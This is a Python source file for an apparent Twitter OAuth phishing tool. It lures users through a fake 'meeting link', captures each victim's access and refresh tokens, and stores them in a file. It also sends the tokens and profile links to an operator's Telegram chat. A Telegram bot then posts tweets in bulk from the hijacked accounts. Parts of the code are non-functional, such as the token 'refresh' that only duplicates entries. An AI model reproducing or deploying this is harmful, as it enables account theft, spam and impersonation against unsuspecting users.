import base64
import hashlib
import os
import requests
import time
from flask import Flask, redirect, request, session, render_template
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, CallbackQueryHandler, Updater, MessageHandler, Filters

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = 'https://gifter-7vz7.onrender.com/'  # Update with your callback URL
ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')  # Token for the alert bot
AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')  # Token for the automation bot
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize the two bots
alert_bot = Bot(token=ALERT_BOT_TOKEN)
automation_bot = Bot(token=AUTOMATION_BOT_TOKEN)
alert_updater = Updater(token=ALERT_BOT_TOKEN, use_context=True)
automation_updater = Updater(token=AUTOMATION_BOT_TOKEN, use_context=True)
alert_dispatcher = alert_updater.dispatcher
automation_dispatcher = automation_updater.dispatcher

# Function to save tokens to file
def save_tokens_to_file(access_token, refresh_token):
    with open('tokens.txt', 'a') as file:
        file.write(f"{access_token},{refresh_token}\n")

# Function to load tokens from file
def load_tokens():
    tokens = []
    if os.path.exists('tokens.txt'):
        with open('tokens.txt', 'r') as file:
            tokens = [line.strip().split(',') for line in file if line.strip()]
    return tokens

def get_total_tokens():
    return len(load_tokens())

def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        username = data.get("data", {}).get("username")
        return username
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None

# OAuth and meeting setup
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )

    # Send the message through the alert bot
    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Function to send tokens to Telegram using the alert bot
def send_to_telegram(access_token, refresh_token=None):
    alert_emoji = "🚨"
    key_emoji = "🔑"
    
    username = get_twitter_username(access_token)
    twitter_url = f"https://twitter.com/{username}" if username else "Unknown user"

    total_tokens = get_total_tokens()

    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
    message += f"🧮 *Total Available Tokens:* {total_tokens}\n"

    if refresh_token:
        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"

    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"

    save_tokens_to_file(access_token, refresh_token)

    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Telegram Bot for Automation Tasks
def start_automation(update, context):
    keyboard = [
        [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
        [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
        [InlineKeyboardButton("Post (Bulk Tokens)", callback_data='post_bulk')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Choose an option:', reply_markup=reply_markup)

def handle_button(update, context):
    query = update.callback_query
    query.answer()

    if query.data == 'refresh_all':
        query.edit_message_text(text="Refreshing all tokens...")
        refresh_all_tokens()
    elif query.data == 'post_single':
        query.edit_message_text(text="Posting with a single token. Please enter your message:")
        context.user_data['post_mode'] = 'single'
    elif query.data == 'post_bulk':
        query.edit_message_text(text="Enter the number of tokens to use for posting:")
        context.user_data['post_mode'] = 'bulk'

def handle_message(update, context):
    user_message = update.message.text
    post_mode = context.user_data.get('post_mode')

    if post_mode == 'single':
        post_with_single_token(user_message)
    elif post_mode == 'bulk':
        try:
            num_tokens = int(user_message)
            context.user_data['num_tokens'] = num_tokens
            update.message.reply_text(f"Using {num_tokens} tokens. Now, please enter the message content:")
        except ValueError:
            update.message.reply_text("Please enter a valid number.")

def refresh_all_tokens():
    tokens = load_tokens()
    refreshed_count = 0
    for access_token, refresh_token in tokens:
        new_access_token = access_token
        new_refresh_token = refresh_token
        save_tokens_to_file(new_access_token, new_refresh_token)
        refreshed_count += 1
    automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.")

def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {"text": tweet_text}
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

def post_with_single_token(message):
    tokens = load_tokens()
    if tokens:
        access_token, _ = tokens[0]
        result = post_tweet(access_token, message)
        automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
    else:
        automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="No tokens available.")

def post_with_bulk_tokens(message, num_tokens):
    tokens = load_tokens()
    if tokens and num_tokens <= len(tokens):
        for i in range(num_tokens):
            access_token, _ = tokens[i]
            result = post_tweet(access_token, message)
            automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
            time.sleep(5)  # Delay between posts
    else:
        automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Not enough tokens available.")

# Set up command handlers for automation bot
automation_dispatcher.add_handler(CommandHandler('start', start_automation))
automation_dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
automation_dispatcher.add_handler(CallbackQueryHandler(handle_button))

# Flask route
@app.route('/')
def home():
    pass

# Run the bots
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send startup message through alert bot
    alert_updater.start_polling()  # Start alert bot polling
    automation_updater.start_polling()  # Start automation bot polling
    app.run(host='0.0.0.0', port=port)
